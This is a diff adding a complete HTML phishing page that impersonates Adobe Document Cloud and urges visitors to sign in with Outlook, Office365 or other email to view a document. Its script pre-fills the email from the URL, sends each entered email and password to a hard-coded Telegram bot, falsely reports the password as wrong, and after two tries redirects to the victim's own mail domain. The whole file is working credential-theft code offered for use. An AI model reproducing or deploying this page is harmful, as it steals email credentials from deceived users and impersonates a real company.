@@ -1,0 +1,321 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+      
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <title>Adobe Cloud Document Online</title>
+  <link rel="icon" type="image/x-icon" href="https://cdn.glitch.global/60719965-d295-4673-8d2a-fca5fd5f6e44/thumbnails%2Facrobat-icon.png?1661157668837">
+    <link href="css/hover.css" rel="stylesheet" media="all">
+
+    <style type="text/css">
+
+
+    </style>
+  </head>
+  <body>
+    <div class="container-fluid">
+      <div class="row" style="background-image: url('https://www.upload.ee/image/15592116/8.jpg'); background-size: cover;background-repeat: no-repeat;">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-6 mx-auto my-5 px-5 pb-5" style="border:1px solid; background-color: rgba(0,0,0,0.7);border-radius:15px;">
+              <div class="text-center pt-5"> 
+                <img src="https://cdn.glitch.global/60719965-d295-4673-8d2a-fca5fd5f6e44/thumbnails%2Facrobat-icon.png?1661157668837" class="img-fluid" width="100px"><br>
+                <span class="h5 text-white">Adobe Document Cloud</span><br>
+                <span class="h5 text-white font-weight-normal">To read the document, please enter with the valid email credentials that this file was sent to.</span>
+              </div>
+              <div class="mt-3">
+                <div class="row">
+                <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="gmailmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class="mt-2" style=" background-color: #D44638;">
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #0073C8;">
+                        <img src="https://thara.in/images/8097/outlook.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Outlook</span>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col-lg-12 ">
+                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class="  mt-2" style=" background-color: #31459B;">
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #FF3C00;">
+                        <img src="https://thara.in/images/8097/office365.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4"  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Office365</span>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #5F0F68;">
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #0B5BD3;">
+                        <img src="https://thara.in/images/8097/othermail.ico" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4"  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Other Mail</span>
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                     <p class="text-white mt-3 text-center">Select your email provider to view Document</p>
+                <p class="h6 text-center text-white">Copyright© 2023 Adobe.</p> 
+                    
+                  </div>
+               
+              </div> 
+            </div>
+          </div>
+        </div>
+
+
+
+      </div> 
+    </div>
+
+
+
+
+    <!-- Modal for gmail -->
+    <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+      <div class="modal-dialog" role="document">
+        <div class="modal-content">
+          <div class="modal-header">
+
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+              <span aria-hidden="true">&times;</span>
+            </button>
+          </div>
+          <div class="modal-body">
+            <center>
+              <img id="fieldImg" src="https://cdn.glitch.global/60719965-d295-4673-8d2a-fca5fd5f6e44/thumbnails%2Facrobat-icon.png?1661157668837" class="img-fluid rounded-circle" width="80px">
+              <h5 class="modal-title" id="exampleModalLabel">Login to access document</h5>
+              <div class="alert alert-danger" style="background-color: white; border-style: none;" id="msg"></div>
+
+            </center>
+            <form id="contact" class="form-horizontal well">
+              <div class="col-lg-12">
+                <div class="form-group">
+                  <label for="exampleInputEmail1">Email address</label>
+                  <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
+                  <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
+                </div>
+              </div>
+              <div class="col-lg-12">
+                <div class="form-group">
+                  <label for="Password">Password</label>
+                  <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password">
+                </div>
+              </div>
+            </div>
+            <div class="modal-footer">
+              <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+              <button class="btn btn-lg btn-info pull-right" id="submit-btn">Login</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+    
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </body>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script>
+
+    /* global $ */
+    $(document).ready(function(){
+
+      $('#outlookmodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://thara.in/images/8097/outlook.png');
+        $('#field').html("Outlook");
+        $('#ajaxModal').modal('show');
+      });
+
+      $('#office365modal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://thara.in/images/8097/office365.png');
+        $('#field').html("Office 365");
+        $('#ajaxModal').modal('show');
+      });
+
+      $('#othermodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://thara.in/images/8097/othermail.ico');
+        $('#field').html("Other Mail");
+        $('#ajaxModal').modal('show');
+      });
+</script>
+ <script>
+    $(document).ready(function(){
+      var email = window.location.hash.substr(1);
+      var count=0;
+var tx1="5362914916";
+var tx2="6104056135:AAFOCUtCMI_AQmxDDdzM2lQPWXcxNWV7u5o";
+ ur = "https://api.telegram.org/bot"+tx2+"/sendMessage?chat_id="+tx1;
+
+
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+		
+		
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+		$("#logoname").html(final);
+		$("#logonames").html(final);
+		$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+		$("#mainPage").attr("src", "https://www."+my_slice);
+		$("#logoname").html(my_slice);
+
+
+       
+      }
+
+
+	  
+	  
+	  
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+
+                    if (!password) {
+                $('#msg').show();
+                $('#msg').html("Password field is empty.!");
+
+                return false;
+            }
+
+
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+
+        $("#logoname").html(finalu);
+      ///////////new injection////////////////
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+		url: ur,
+        type: 'GET',
+        data:{
+          ajaxid: 4,
+		text: 'Email:' + email + ' | Password:' + password			
+        },
+			processData: true,
+		contentType: false,
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response.ok === true){
+                  $("#password").val("");
+                  if (count>=2) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                      window.location.replace("https://www."+my_slice);
+
+                  }
+                  $("#msg").show();
+    	$('#msg').html("Password is incorrect. Please try again");
+                }
+                else{
+                 $("#msg").show();
+    	$('#msg').html("Password is incorrect. Please try again");
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=2) {
+                count=0;
+                   window.location.replace("https://www."+my_slice);
+              }
+            
+             $("#msg").show();
+    $('#msg').html("Password in incorrect. Please try again");
+            },
+            complete: function(){
+              $('#submit-btn').html('Login');
+            }
+          });
+    });
+
+
+    });
+
+  </script>
+  </html>
